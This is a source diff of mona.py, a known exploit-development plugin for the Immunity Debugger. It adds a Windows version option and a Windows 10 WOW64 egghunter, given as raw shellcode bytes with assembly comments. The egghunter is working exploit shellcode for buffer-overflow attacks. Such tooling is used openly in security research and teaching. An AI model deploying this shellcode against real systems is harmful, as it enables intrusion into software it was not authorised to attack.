@@ -2,7 +2,7 @@
  
 U{Corelan<https://www.corelan.be>}
 
-Copyright (c) 2011-2018, Peter Van Eeckhoutte - Corelan GCV
+Copyright (c) 2011-2019, Peter Van Eeckhoutte - Corelan GCV
 All rights reserved.
 
 Redistribution and use in source and binary forms, with or without
@@ -27,12 +27,12 @@ ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  
-$Revision: 583 $
-$Id: mona.py 583 2018-06-27 15:35:00Z corelanc0d3r $ 
+$Revision: 585 $
+$Id: mona.py 585 2019-02-23 09:00:00Z corelanc0d3r $ 
 """
 
 __VERSION__ = '2.0'
-__REV__ = filter(str.isdigit, '$Revision: 583 $')
+__REV__ = filter(str.isdigit, '$Revision: 585 $')
 __IMM__ = '1.8'
 __DEBUGGERAPP__ = ''
 arch = 32
@@ -13072,6 +13072,8 @@ def main(args):
 			usewow64 = False
 			useboth = False
 			egg_size = 0
+			win_ver = "10"
+			win_vers = ["7","10"]
 			checksumbyte = ""
 			extratext = ""
 			
@@ -13084,6 +13086,11 @@ def main(args):
 					filename = args["f"]
 			filename = filename.replace("'", "").replace("\"", "")					
 
+			if "winver" in args:
+				if str(args["winver"]) in win_vers:
+					win_ver = str(args["winver"])
+				else:
+					dbg.log("[-] Didn't recognize windows version, using Win10 as the default", highlight=True)
 			#Set egg
 			if "t" in args:
 				if type(args["t"]).__name__.lower() != "bool":
@@ -13153,7 +13160,7 @@ def main(args):
 			getsize = ""
 			getpc = ""
 			
-			jmppayload = "\xff\xe7"
+			jmppayload = "\xff\xe7"	#jmp edi
 			
 			if "depmethod" in args:
 				if args["depmethod"].lower() in depmethods:
@@ -13216,35 +13223,64 @@ def main(args):
 				)
 
 			if usewow64:
+				dbg.log("[+] Generating egghunter for wow64, Windows %s" % win_ver)
 				egghunter = ""
-				egghunter += (
-					# 64 stub needed before loop
-					"\x31\xdb"                                      #xor ebx,ebx
-					"\x53"                                          #push ebx
-					"\x53"                                          #push ebx
-					"\x53"                                          #push ebx
-					"\x53"                                          #push ebx
-					"\xb3\xc0"                                      #mov bl,0xc0
-	
-					# 64 Loop
-					"\x66\x81\xCA\xFF\x0F"                          #OR DX,0FFF
-					"\x42"                                          #INC EDX
-					"\x52"                                          #PUSH EDX
-					"\x6A\x26"                                      #PUSH 26 
-					"\x58"                                          #POP EAX
-					"\x33\xC9"                                      #XOR ECX,ECX
-					"\x8B\xD4"                                      #MOV EDX,ESP
-					"\x64\xff\x13"                                  #CALL DWORD PTR FS:[ebx]
-					"\x5e"                                          #POP ESI
-					"\x5a"                                          #POP EDX
-					"\x3C\x05"                                      #CMP AL,5
-					"\x74\xe9"                                      #JE SHORT
-					"\xB8"+egg+                                     #MOV EAX,74303077 w00t
-					"\x8B\xFA"                                      #MOV EDI,EDX
-					"\xAF"                                          #SCAS DWORD PTR ES:[EDI]
-					"\x75\xe4"                                      #JNZ "inc edx"
-					"\xAF"                                          #SCAS DWORD PTR ES:[EDI]
-					"\x75\xe1"                                      #JNZ "inc edx"
+				if win_ver == "7":
+					egghunter += (
+						# 64 stub needed before loop
+						"\x31\xdb"                                      #xor ebx,ebx
+						"\x53"                                          #push ebx
+						"\x53"                                          #push ebx
+						"\x53"                                          #push ebx
+						"\x53"                                          #push ebx
+						"\xb3\xc0"                                      #mov bl,0xc0
+		
+						# 64 Loop
+						"\x66\x81\xCA\xFF\x0F"                          #OR DX,0FFF
+						"\x42"                                          #INC EDX
+						"\x52"                                          #PUSH EDX
+						"\x6A\x26"                                      #PUSH 26 
+						"\x58"                                          #POP EAX
+						"\x33\xC9"                                      #XOR ECX,ECX
+						"\x8B\xD4"                                      #MOV EDX,ESP
+						"\x64\xff\x13"                                  #CALL DWORD PTR FS:[ebx]
+						"\x5e"                                          #POP ESI
+						"\x5a"                                          #POP EDX
+						"\x3C\x05"                                      #CMP AL,5
+						"\x74\xe9"                                      #JE SHORT
+						"\xB8"+egg+                                     #MOV EAX,74303077 w00t
+						"\x8B\xFA"                                      #MOV EDI,EDX
+						"\xAF"                                          #SCAS DWORD PTR ES:[EDI]
+						"\x75\xe4"                                      #JNZ "inc edx"
+						"\xAF"                                          #SCAS DWORD PTR ES:[EDI]
+						"\x75\xe1"                                      #JNZ "inc edx"
+						"")
+				elif win_ver == "10":
+					egghunter += (
+					"\x33\xD2"             #XOR EDX,EDX
+					"\x66\x81\xCA\xFF\x0F" #OR DX,0FFF
+					"\x33\xDB"             #XOR EBX,EBX
+					"\x42"               	#INC EDX
+					"\x52"               	#PUSH EDX
+					"\x53"               	#PUSH EBX 
+					"\x53"               	#PUSH EBX
+					"\x53"               	#PUSH EBX
+					"\x53"               	#PUSH EBX
+					"\x6A\x29"            	#PUSH 29
+					"\x58"               	#POP EAX
+					"\xB3\xC0"            	#MOV BL,0C0
+					
+					"\x64\xFF\x13"         #CALL DWORD PTR FS:[EBX]
+					"\x83\xC4\x10"         #ADD ESP,0x10
+					"\x5A"               	#POP EDX
+					"\x3C\x05"            	#CMP AL,5
+					"\x74\xE3"            	#JE SHORT
+					"\xB8" + egg +  		#MOV EAX,<tag>
+					"\x8B\xFA"             #MOV EDI,EDX
+					"\xAF"               	#SCAS DWORD PTR ES:[EDI]
+					"\x75\xDE"            	#JNZ SHORT
+					"\xAF"              	#SCAS DWORD PTR ES:[EDI]
+					"\x75\xDB"    			#JNZ SHORT
  				)
 			
 			if usechecksum:
@@ -13415,7 +13451,7 @@ def main(args):
 
 			dbg.log("[+] Egghunter %s (%d bytes): " % (extratext,len(egghunter.strip().replace(" ",""))))
 			dbg.logLines("%s" % egghunter_hex)
-			
+		
 			objegghunterfile.write("Egghunter " + extratext + ", tag " + egg + " : ",egghunterfile)
 			objegghunterfile.write(egghunter_hex,egghunterfile)			
 
@@ -18126,7 +18162,9 @@ Optional arguments :
     -c : enable checksum routine. Only works in conjunction with parameter -f
     -f <filename> : file containing the shellcode
     -startreg <reg> : start searching at the address pointed by this reg
-    -wow64 : generate wow64 egghunter. Default is traditional 32bit egghunter
+    -wow64 : generate wow64 egghunter (Win7 and Win10). Default is traditional 32bit egghunter
+    -winver <ver> : indicate Windows version for wow64 egghunter. Default is Windows 10. 
+                    valid values are 7 and 10.	
 DEP Bypass options :
     -depmethod <method> : method can be "virtualprotect", "copy" or "copy_size"
     -depreg <reg> : sets the register that contains a pointer to the API function to bypass DEP. 
